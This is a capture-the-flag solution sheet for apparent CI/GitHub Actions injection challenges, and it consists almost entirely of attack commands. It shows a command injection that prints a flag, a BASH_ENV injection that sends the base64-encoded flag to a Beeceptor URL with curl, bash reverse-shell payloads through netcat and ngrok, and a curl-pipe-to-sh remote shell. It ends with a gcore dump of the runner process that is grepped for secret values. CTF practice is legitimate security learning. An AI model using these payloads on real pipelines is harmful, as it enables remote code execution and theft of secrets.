# Chall 1
 
```

Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi

```
 
# Chall 2 & 3
 
[Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
 
[Beeceptor](https://beeceptor.com/)
 
[Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
 
```

Not a release :(

BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base64))

```
 
# Chall 4
 
## Setup (client side)
 
### Listen with NC

```

nc -lv 4444

```
 
### Setup ngrok
 
```

ngrok tcp 4444

```
 
### Get ngrok IP to build payload
 
```

dig <NGROK_DNS>

```
 
## Payload
 
```

$(bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1)

```
 
## Fancy shell for lazy DevOps :)
 
```

curl -sSf https://sshx.io/get | sh -s run

```
 
## Let's investigate!
 
The directory `/home/runner/work/_temp` look interesting...
 
# Chall 5
 
### Listen with NC

```

nc -lv 4444

```
 
### Setup ngrok
 
```

ngrok tcp 4444

```
 
### Get ngrok IP to build payload
 
```

dig <NGROK_DNS>

```
 
## Payload
 
```

; bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1

```
 
## Fancy shell for lazy DevOps :)
 
```

curl -sSf https://sshx.io/get | sh -s run

```
 
## Let's dump!
 
### Let's check those secrets
 
```

sudo apt-get install -y gdb; sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{print $1}')"; grep -Eao '"[^"]+":\{"value":"[^"]*","isSecret":true\}' k.dump*

```

 